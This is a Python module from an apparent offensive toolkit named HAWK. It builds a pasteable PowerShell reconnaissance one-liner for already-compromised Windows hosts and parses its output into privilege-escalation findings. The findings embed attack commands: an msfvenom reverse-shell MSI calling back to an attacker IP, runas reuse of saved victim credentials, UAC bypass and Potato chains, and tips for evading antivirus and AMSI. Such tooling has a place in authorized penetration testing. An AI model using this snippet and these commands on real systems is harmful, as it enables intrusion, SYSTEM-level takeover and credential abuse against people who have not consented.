# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK — Windows Post-RCE quick-recon snippet generator + output analyzer.

Mirror of utils/post_rce_recon.py but for Windows targets.

Why a separate module?
──────────────────────
The Windows post-exploitation surface is fundamentally different
from Linux:

  • Token privileges (SeImpersonate / SeAssignPrimaryToken /
    SeBackup / SeRestore / SeDebug / SeTakeOwnership) are the
    central concept — there's nothing analogous on Linux.
  • Group enumeration goes through `whoami /groups` and
    `net localgroup`, not getent/NSS.
  • Service-based privesc (unquoted paths, weak ACLs, writable
    binaries on running services) replaces Linux's SUID model.
  • Reverse shells on Windows are usually cmd.exe, not bash, but
    PowerShell is far more capable for enumeration — the snippet
    is built so it works either way: the cmd-friendly invocation
    boots `powershell.exe -ep bypass -c …` to get full PS access.

Output format
─────────────
Identical scheme as the Linux module — `___HAWK_BEGIN___ … ___HAWK_END___`
wrapping `<<<SECTION:NAME>>> … <<<END:NAME>>>` blocks — so the
operator parses both with the same mental model and the cheat sheet
matchers in utils/privesc_patterns.py work uniformly.

Sections gathered:
    WHOAMI         — username, groups, host, OS version
    PRIV_TOKENS    — whoami /priv (SeImpersonate, SeBackup, …)
    LOCAL_ADMINS   — net localgroup administrators
    AIE            — AlwaysInstallElevated registry keys
    UNQUOTED_SVC   — services with unquoted paths containing spaces
    WEAK_SVC_PERMS — services where current user has write/start
    SCHED_TASKS    — scheduled tasks running as SYSTEM
    SAVED_CREDS    — cmdkey /list (saved credentials)
    OS_VERSION     — full systeminfo header (build, hotfixes)
    HOST_DETAILS   — hostname, domain join, antivirus brand

Public API
──────────
``generate_snippet()`` — returns a one-line cmd-pasteable string
that bootstraps PowerShell and dumps everything between BEGIN/END
markers.

``analyze_output(text)`` — returns a dict with the same shape as
the Linux module: ``user``, ``host``, ``os_version``,
``token_privs`` (set of enabled privileges), ``local_admin`` (bool),
``findings`` (list of finding dicts ready for add_auto_finding),
``parse_warnings``.
"""

from __future__ import annotations
import re
from typing import Iterable


# ─── Token privileges that are interesting for privesc ────────────
# Each entry: (privilege_name, severity, short_explanation).  When
# the snippet output shows the privilege is "Enabled" (not just
# "Disabled" — disabled privs in a token are still potentially
# enable-able via SeAssignPrimaryToken but the common Potato chain
# requires Enabled), we emit the corresponding finding.
_PRIV_TOKENS = [
    ("SeImpersonatePrivilege",       "critical",
     "Direct path to SYSTEM via JuicyPotato / PrintSpoofer / "
     "RoguePotato / GodPotato.  Service accounts (IIS, MSSQL, "
     "managed service accounts) almost always have this — "
     "every Potato variant trades it for a SYSTEM shell."),
    ("SeAssignPrimaryTokenPrivilege", "critical",
     "Equivalent to SeImpersonate for Potato attacks — "
     "use the same chain."),
    ("SeBackupPrivilege",            "high",
     "Read ANY file regardless of ACL — including SAM/SYSTEM "
     "registry hives (offline Mimikatz / impacket-secretsdump "
     "against the dumped hives gives you all local hashes)."),
    ("SeRestorePrivilege",           "high",
     "Write ANY file regardless of ACL — typically chained with "
     "SeBackup to overwrite SYSTEM-protected DLLs / scheduled "
     "tasks for SYSTEM persistence."),
    ("SeTakeOwnershipPrivilege",     "high",
     "Take ownership of any object → grant yourself FullControl "
     "→ overwrite a SYSTEM service binary."),
    ("SeDebugPrivilege",             "high",
     "OpenProcess(PROCESS_ALL_ACCESS) on any process including "
     "lsass.exe → token theft / Mimikatz."),
    ("SeLoadDriverPrivilege",        "high",
     "Load a kernel driver — load a vulnerable signed driver "
     "(BYOVD: Capcom.sys, Dell DBUtil, …) for SYSTEM RW kernel "
     "primitives.  Game over."),
    ("SeManageVolumePrivilege",      "medium",
     "FormatVolume — niche, but combinable with SeRestore for "
     "arbitrary file write via volume shadow trickery."),
    ("SeTcbPrivilege",               "critical",
     "Act as part of the TCB.  Effectively SYSTEM-equivalent."),
]


_SECTION_MARK = "<<<SECTION:{}>>>"
_END_MARK     = "<<<END:{}>>>"


def generate_snippet() -> str:
    """Return a single-line snippet that — when pasted into a
    Windows shell (cmd.exe in a reverse shell, evil-winrm, psexec,
    smbclient remote-exec, …) — boots PowerShell and dumps
    structured recon output between marker tokens.

    Why bootstrap PowerShell from cmd?
    ──────────────────────────────────
    Reverse shells popped from web RCEs are almost always cmd.exe.
    Many of the recon checks (Get-CimInstance, ACL inspection,
    Get-ScheduledTask) have no clean cmd equivalent.  The cleanest
    portable form is therefore:

        powershell -NoProfile -ExecutionPolicy Bypass -Command "<one-liner>"

    The PowerShell one-liner uses `Write-Host` (writes to stdout
    even when the host is non-interactive — `Write-Output` can
    get swallowed by the cmd wrapper).  We wrap each section in
    the same ASCII markers as the Linux side so the analyzer is
    structurally identical.
    """
    ps_lines: list[str] = []
    ps_lines.append("Write-Host '___HAWK_BEGIN___'")

    def section(name: str, lines: Iterable[str]) -> None:
        ps_lines.append(f"Write-Host '{_SECTION_MARK.format(name)}'")
        ps_lines.extend(lines)
        ps_lines.append(f"Write-Host '{_END_MARK.format(name)}'")

    # Identity, host, OS — equivalent of the Linux WHOAMI block.
    section("WHOAMI", [
        "whoami",
        "hostname",
        "[Environment]::OSVersion.VersionString",
        "(Get-WmiObject Win32_OperatingSystem).Caption",
        "(Get-WmiObject Win32_ComputerSystem).Domain",
    ])

    # Token privileges.  `whoami /priv` works in both cmd and PS,
    # outputs human-readable text (Privilege Name | State).
    section("PRIV_TOKENS", [
        "whoami /priv",
    ])

    # Group memberships (local + domain).  whoami /groups handles
    # both transparently.
    section("GROUPS", [
        "whoami /groups",
    ])

    # Local administrators — fast check whether current user is
    # already-admin (in which case skip privesc enumeration).
    section("LOCAL_ADMINS", [
        "net localgroup administrators",
    ])

    # AlwaysInstallElevated — both keys must be 0x1 for the .msi
    # privesc to work.  reg query is the most universal probe.
    # 2>&1 to capture "ERROR: The system was unable to find the
    # specified registry key or value" which is a useful signal
    # (means the policy isn't set, exploit won't work).
    section("AIE", [
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer "
        "/v AlwaysInstallElevated 2>&1",
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer "
        "/v AlwaysInstallElevated 2>&1",
    ])

    # Unquoted service paths.  Win32_Service via CIM is portable
    # back to Win 7 / 2008 R2 — wmic is deprecated on Win11/2022
    # so we don't use it.  We filter for services where:
    #   - it isn't already quoted with a leading " AND
    #   - the EXECUTABLE PATH contains a space
    # which is the classic vulnerable shape (C:\Program Files\…\foo.exe).
    #
    # "the executable path", not "the PathName": PathName includes the
    # arguments, and `-match ' '` over the whole string made every
    # stock svchost service —
    #     C:\Windows\system32\svchost.exe -k netsvcs -p
    # — a HIGH privesc candidate. There is no space in that exe path;
    # the spaces are in the arguments and Windows never mis-parses
    # them. Splitting on `.exe` and testing only what comes before it
    # keeps the real hits and drops that entire class.
    # NOTE the `\x22` instead of a literal double quote: the whole
    # payload lives inside ONE pair of cmd double quotes (see the
    # invariant at the bottom of this function), so a literal `"`
    # here closes the cmd argument early and dumps the rest of the
    # snippet — metacharacters and all — into cmd's parser.
    # `\x22` is the .NET-regex escape for `"` and matches the same
    # thing.
    section("UNQUOTED_SVC", [
        "Get-CimInstance Win32_Service "
        "| Where-Object { $_.PathName -and "
        "$_.PathName -notmatch '^\\x22' -and "
        "(($_.PathName -split '(?i)\\.exe')[0]) -match ' ' } "
        "| Select-Object Name, PathName, StartMode, StartName "
        "| Format-Table -AutoSize | Out-String -Width 4096",
    ])

    # Scheduled tasks running as SYSTEM.  Get-ScheduledTask is
    # the modern API; the legacy schtasks /query also works but
    # dumps far more than we need.
    section("SCHED_TASKS", [
        "Get-ScheduledTask 2>$null "
        "| Where-Object { $_.Principal.UserId -match 'SYSTEM' "
        "-and $_.State -ne 'Disabled' } "
        "| Select-Object TaskPath, TaskName, State "
        "| Format-Table -AutoSize | Out-String -Width 4096",
    ])

    # Saved credentials in the credential vault — `cmdkey /list`
    # shows entries the current user can use without re-entering
    # the password.  These often unlock RDP / SMB / web SSO into
    # other boxes (lateral movement).
    section("SAVED_CREDS", [
        "cmdkey /list",
    ])

    # OS version + installed patches (for kernel-CVE / OS-CVE
    # cross-reference).  Trim to just the lines we care about so
    # the analyzer doesn't have to wade through 200+ lines of
    # systeminfo output.
    section("OS_VERSION", [
        "systeminfo "
        "| Select-String -Pattern 'OS Name','OS Version',"
        "'System Type','Hotfix','Domain'",
    ])

    # Antivirus product brand — affects which .exe variants of
    # winpeas / Potato will detonate vs. get quarantined.
    section("AV", [
        "Get-CimInstance -Namespace 'root\\SecurityCenter2' "
        "-ClassName AntivirusProduct 2>$null "
        "| Select-Object displayName, productState "
        "| Format-Table -AutoSize | Out-String -Width 4096",
    ])

    # Internet reachability (mirrors the Linux check).  Test-
    # NetConnection is verbose; Invoke-WebRequest with timeout is
    # cleaner.  -UseBasicParsing avoids the IE-engine init cost.
    section("INTERNET", [
        "try { "
        "$r = Invoke-WebRequest -Uri 'https://1.1.1.1' "
        "-UseBasicParsing -TimeoutSec 3 -ErrorAction Stop; "
        # Concatenation, not an interpolated double-quoted string:
        # see the no-double-quote invariant below.
        "Write-Host ('http_code=' + $r.StatusCode) "
        "} catch { Write-Host 'http_code=000' }",
    ])

    ps_lines.append("Write-Host '___HAWK_END___'")

    # Join into a single PS one-liner with semicolons.  Then wrap
    # in `powershell -NoProfile -ExecutionPolicy Bypass -Command`
    # so it pastes cleanly into any cmd.exe shell.  The whole PS
    # payload goes inside ONE pair of cmd DOUBLE quotes: cmd passes
    # it through untouched, and PowerShell then sees the inner
    # SINGLE quotes as its own string delimiters — which is why
    # every literal in the payload (markers included) is
    # single-quoted and why the payload must never contain a
    # double quote of its own.
    ps_payload = "; ".join(ps_lines)

    # Hard invariant, not a style rule.  cmd.exe toggles quoting on
    # every `"` it sees: the wrapper opens the argument, and the
    # FIRST literal double quote inside the payload closes it again.
    # Everything after that is parsed by cmd, which then meets the
    # payload's `|`, `<`, `>` and `2>$null` as real pipes and
    # redirections — cmd answers "The syntax of the command is
    # incorrect." and no ___HAWK_BEGIN___ block ever comes back.
    # It shipped broken exactly this way, so the invariant is
    # enforced here rather than left to a comment.  Use `\x22` in
    # regexes and string concatenation instead of interpolation.
    if '"' in ps_payload:
        bad = ps_payload.index('"')
        raise AssertionError(
            "post_rce_recon_win: PowerShell payload must contain no "
            "double quotes (the cmd.exe wrapper supplies the only "
            f"pair). First one at offset {bad}: "
            f"...{ps_payload[max(0, bad - 40):bad + 40]}...")

    return (
        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
        f"\"{ps_payload}\""
    )


# ─── Analyzer ──────────────────────────────────────────────────────

def _extract_section(blob: str, name: str) -> str:
    start = blob.find(_SECTION_MARK.format(name))
    end   = blob.find(_END_MARK.format(name))
    if start == -1 or end == -1 or end < start:
        return ""
    nl = blob.find("\n", start)
    if nl == -1 or nl >= end:
        return ""
    return blob[nl + 1:end].rstrip("\n").rstrip()


def _trim_to_markers(text: str) -> str:
    """Cut `text` down to the LAST ``___HAWK_BEGIN___ … ___HAWK_END___``.

    Same reasoning as the Linux module: a pasted shell transcript opens
    with the echo of the pasted command, and that command line contains
    both markers literally.  Cutting at the FIRST of each kept the
    echoed command and dropped all of the real output.
    """
    blob = text or ""
    end = blob.rfind("___HAWK_END___")
    begin = blob.rfind("___HAWK_BEGIN___",
                       0, end if end != -1 else len(blob))
    if begin != -1:
        blob = blob[begin:]
        if end != -1:
            end -= begin
    if end != -1:
        blob = blob[:end]
    return blob


def _aie_hive_is_set(aie_text: str, hive: str) -> bool:
    """True when `hive`'s OWN reg-query block reports 0x1.

    The AIE section holds the output of two `reg query` calls, one per
    hive, back to back.  The previous check was a single DOTALL
    regex — `HKEY_LOCAL_MACHINE.*?AlwaysInstallElevated\\s+REG_DWORD\\s+0x1`
    — whose `.*?` walked straight past the HKLM block's `0x0` and
    matched the value line in the HKCU block below it.  Both probes
    then returned True and a lone 0x1 on HKCU was reported as the
    CRITICAL "both keys are set" condition, which is not exploitable.
    Scope the search to the block that belongs to the hive.
    """
    for block in re.split(r"(?m)^(?=HKEY_)", aie_text or ""):
        if not block.startswith(hive):
            continue
        if re.search(r"AlwaysInstallElevated\s+REG_DWORD\s+0x0*1\b",
                     block, re.I):
            return True
    return False


def _extract_target_label(out: dict) -> str:
    """Build a scope-rich label for finding titles."""
    parts = []
    if out.get("host"):
        parts.append(out["host"])
    elif out.get("user"):
        parts.append(out["user"])
    return parts[0] if parts else "target"


def analyze_output(text: str) -> dict:
    """Parse the captured snippet output and return a structured
    dict ready for the dialog to push as Target Intel findings."""
    blob = _trim_to_markers(text)

    out = {
        "user":           "",
        "host":           "",
        "os_version":     "",
        "domain":         "",
        "token_privs":    {},   # name -> "Enabled" / "Disabled"
        "local_admin":    False,
        "av":             "",
        "internet":       "unknown",
        "findings":       [],
        "parse_warnings": [],
    }

    # Nothing to parse at all: say so loudly instead of returning an
    # empty-but-successful-looking result.  The marker has to start a
    # LINE — the echoed command line contains every marker literally
    # (`Write-Host '<<<SECTION:WHOAMI>>>'`), so a substring test would
    # call a paste of the command alone a successful parse.
    if not re.search(r"^[^\S\n]*<<<SECTION:", blob, re.M):
        out["parse_warnings"].append(
            "No <<<SECTION:...>>> markers in the pasted text — this "
            "is not snippet output. Re-run the snippet on the target "
            "and paste everything from ___HAWK_BEGIN___ onwards.")

    # WHOAMI — first non-empty line is `DOMAIN\user` or just `user`.
    who = _extract_section(blob, "WHOAMI")
    if not who:
        out["parse_warnings"].append(
            "WHOAMI section missing — output looks truncated.")
    who_lines = [ln.strip() for ln in who.splitlines() if ln.strip()]
    if who_lines:
        out["user"] = who_lines[0]
    if len(who_lines) > 1:
        out["host"] = who_lines[1]
    # OS version, OS caption, domain — heuristic by content
    for ln in who_lines[2:]:
        if "Microsoft Windows" in ln or "NT " in ln:
            if not out["os_version"]:
                out["os_version"] = ln
        elif ln and ln != "WORKGROUP" and "." in ln and not out["domain"]:
            out["domain"] = ln
        elif ln == "WORKGROUP" and not out["domain"]:
            out["domain"] = "WORKGROUP"

    target_label = _extract_target_label(out)

    # PRIV_TOKENS — parse `whoami /priv` table.  Each row is:
    #     PrivilegeName     Description     State
    # We only care about column 0 (name) and column N-1 (State).
    priv_text = _extract_section(blob, "PRIV_TOKENS")
    for ln in priv_text.splitlines():
        ln = ln.strip()
        if not ln.startswith("Se"):
            continue
        # State is the last whitespace-separated token.
        parts = ln.rsplit(None, 1)
        if len(parts) != 2:
            continue
        priv_name = parts[0].split()[0]
        state = parts[1]
        out["token_privs"][priv_name] = state

    # Emit one finding per privesc-relevant Enabled privilege.
    for priv_name, severity, explanation in _PRIV_TOKENS:
        state = out["token_privs"].get(priv_name)
        if state and state.lower() == "enabled":
            out["findings"].append({
                "title":       (f"Token privilege {priv_name} "
                                f"enabled on {target_label}"),
                "description": (
                    f"`whoami /priv` shows {priv_name} = Enabled "
                    f"on the current token.\n\n{explanation}"
                ),
                "severity":    severity,
                "source":      "post-rce-recon-win",
            })

    # LOCAL_ADMINS — search for current user (or just signal if
    # the user is already in the group).
    admins_text = _extract_section(blob, "LOCAL_ADMINS")
    user_short = out["user"].split("\\")[-1].lower() if out["user"] else ""
    if user_short and user_short in admins_text.lower():
        out["local_admin"] = True
        out["findings"].append({
            "title":       (f"Current user is local admin on "
                            f"{target_label}"),
            "description": (
                f"`{out['user']}` is in BUILTIN\\Administrators.  "
                "No privilege escalation needed — pop a SYSTEM "
                "shell directly with `runas /user:Administrator` "
                "or via UAC bypass (fodhelper, computerdefaults, "
                "wsreset)."
            ),
            "severity":    "high",
            "source":      "post-rce-recon-win",
        })

    # AIE — both keys must be 0x1.  reg query output looks like:
    #     HKEY_LOCAL_MACHINE\…\Installer
    #         AlwaysInstallElevated    REG_DWORD    0x1
    aie_text = _extract_section(blob, "AIE")
    hklm_set = _aie_hive_is_set(aie_text, "HKEY_LOCAL_MACHINE")
    hkcu_set = _aie_hive_is_set(aie_text, "HKEY_CURRENT_USER")
    if hklm_set and hkcu_set:
        out["findings"].append({
            "title":       (f"AlwaysInstallElevated enabled on "
                            f"{target_label}"),
            "description": (
                "Both HKLM and HKCU AlwaysInstallElevated are 0x1 "
                "→ any .msi run by the current user installs as "
                "SYSTEM.  Direct SYSTEM shell with msfvenom-built "
                "MSI:\n\n"
                "  msfvenom -p windows/x64/shell_reverse_tcp "
                "LHOST=YOUR_KALI_IP LPORT=4444 -f msi -o evil.msi\n"
                "  msiexec /quiet /qn /i \\\\YOUR_SMB\\share\\evil.msi"
            ),
            "severity":    "critical",
            "source":      "post-rce-recon-win",
        })
    elif hklm_set ^ hkcu_set:
        out["findings"].append({
            "title":       (f"AlwaysInstallElevated half-set on "
                            f"{target_label}"),
            "description": (
                "Only one of HKLM/HKCU has AlwaysInstallElevated "
                "= 0x1.  The exploit requires BOTH; not currently "
                "actionable but flag-worthy in case the other key "
                "becomes set after a GPO refresh."
            ),
            "severity":    "low",
            "source":      "post-rce-recon-win",
        })

    # UNQUOTED_SVC — list services the operator can plant a binary
    # for.  Each row that has a space-containing path that doesn't
    # start with " (already counted by the snippet's filter).
    unq_text = _extract_section(blob, "UNQUOTED_SVC")
    unq_svcs = []
    for ln in unq_text.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("Name") or ln.startswith("---"):
            continue
        # First token = service name.
        parts = ln.split(None, 1)
        if parts:
            unq_svcs.append(parts[0])
    if unq_svcs:
        out["findings"].append({
            "title":       (f"Unquoted service paths on "
                            f"{target_label} ({len(unq_svcs)})"),
            "description": (
                "Services with unquoted paths containing spaces — "
                "if any earlier path component is writable, drop "
                "an .exe there and `sc start` triggers your "
                "binary as SYSTEM:\n\n"
                + "\n".join(f"  • {s}" for s in unq_svcs[:20])
                + "\n\nVerify writability with: "
                  "icacls \"C:\\Program Files\\Vendor\""
            ),
            "severity":    "high",
            "source":      "post-rce-recon-win",
        })

    # SCHED_TASKS — tasks running as SYSTEM.  Surface as INFO so the
    # operator can grep for one with a writable script path.
    tasks_text = _extract_section(blob, "SCHED_TASKS")
    sys_tasks = []
    for ln in tasks_text.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("TaskPath") or ln.startswith("---"):
            continue
        sys_tasks.append(ln)
    if sys_tasks:
        out["findings"].append({
            "title":       (f"SYSTEM scheduled tasks on "
                            f"{target_label} ({len(sys_tasks)})"),
            "description": (
                "Tasks running as SYSTEM (not disabled).  Look "
                "for any whose action path / script is writable "
                "by your user — overwrite, wait for next tick, "
                "SYSTEM shell.\n\n"
                + "\n".join(f"  • {s}" for s in sys_tasks[:15])
                + ("\n\n…and more" if len(sys_tasks) > 15 else "")
            ),
            "severity":    "medium",
            "source":      "post-rce-recon-win",
        })

    # SAVED_CREDS — anything in cmdkey /list other than the "no
    # credentials" header is interesting.
    creds_text = _extract_section(blob, "SAVED_CREDS")
    if "Target:" in creds_text:
        out["findings"].append({
            "title":       (f"Saved credentials in vault on "
                            f"{target_label}"),
            "description": (
                "`cmdkey /list` shows persisted credentials — "
                "your user can use them without re-entering the "
                "password (RDP / SMB / web SSO).  Lateral move "
                "candidate:\n\n"
                "  runas /savecred /user:DOMAIN\\victim cmd.exe\n"
                "  runas /noprofile /netonly /user:DOMAIN\\victim "
                "powershell\n\n"
                + (creds_text[:600]
                   + ("\n…(truncated)" if len(creds_text) > 600
                      else ""))
            ),
            "severity":    "medium",
            "source":      "post-rce-recon-win",
        })

    # OS_VERSION — captured for the kernel-CVE matchers (currently
    # the patterns target Linux, but this leaves room for Windows
    # CVE-driven patterns later: e.g. PrintNightmare on unpatched
    # Server 2019).
    os_text = _extract_section(blob, "OS_VERSION")
    if os_text:
        out["os_version"] = (out["os_version"]
                              or os_text.splitlines()[0]
                              if os_text.splitlines() else "")
        out["findings"].append({
            "title":       (f"Windows OS fingerprint on "
                            f"{target_label}"),
            "description": (
                f"systeminfo extract:\n\n{os_text[:1200]}"
                + ("\n…(truncated)" if len(os_text) > 1200 else "")
            ),
            "severity":    "info",
            "source":      "post-rce-recon-win",
        })

    # AV — surface as INFO so the user knows which winpeas variant
    # to pick (and how cautious to be with .exe drops).
    av_text = _extract_section(blob, "AV")
    av_brands = []
    for ln in av_text.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("displayName") or ln.startswith("---"):
            continue
        # AV brand can be multi-word ("Windows Defender", "ESET
        # Endpoint Security"), so take everything BEFORE the
        # trailing productState integer that PowerShell's
        # Format-Table emits.  Fallback: full line.
        m = re.match(r"^(.*?)\s+\d+\s*$", ln)
        if m:
            av_brands.append(m.group(1).strip())
        else:
            av_brands.append(ln.strip())
    if av_brands:
        out["av"] = av_brands[0]
        out["findings"].append({
            "title":       f"Antivirus on {target_label}: {out['av']}",
            "description": (
                f"WMI SecurityCenter2 reports `{out['av']}` "
                "active.  Pick a winpeas variant accordingly: "
                "the obfuscated ofs builds bypass most signatures "
                "but Defender/CrowdStrike still flag the AmsiUtils "
                "field flip used by the AMSI bypass — use "
                "PrivescCheck.ps1 in-memory if AMSI is hostile."
            ),
            "severity":    "info",
            "source":      "post-rce-recon-win",
        })

    # Internet reachability — same shape as Linux module.
    inet_text = _extract_section(blob, "INTERNET")
    m = re.search(r"http_code=(\d+)", inet_text)
    if m:
        code = m.group(1)
        if code in ("200", "204") or code.startswith("3"):
            out["internet"] = "online"
        elif code == "000":
            out["internet"] = "offline"
            out["findings"].append({
                "title":       (f"Target appears air-gapped "
                                f"({target_label})"),
                "description": (
                    "Outbound HTTPS to 1.1.1.1 timed out.  "
                    "Privesc paths that need to download "
                    "PrivescCheck / GodPotato / kernel exploits "
                    "from GitHub will fail; transfer binaries "
                    "via SMB share or the existing RCE channel."
                ),
                "severity":    "info",
                "source":      "post-rce-recon-win",
            })

    # Sort findings by severity for the dialog.
    sev_order = {"critical": 0, "high": 1, "medium": 2,
                 "low": 3, "info": 4}
    out["findings"].sort(key=lambda f: sev_order.get(
        (f.get("severity") or "info").lower(), 99))

    return out


__all__ = [
    "generate_snippet",
    "analyze_output",
]
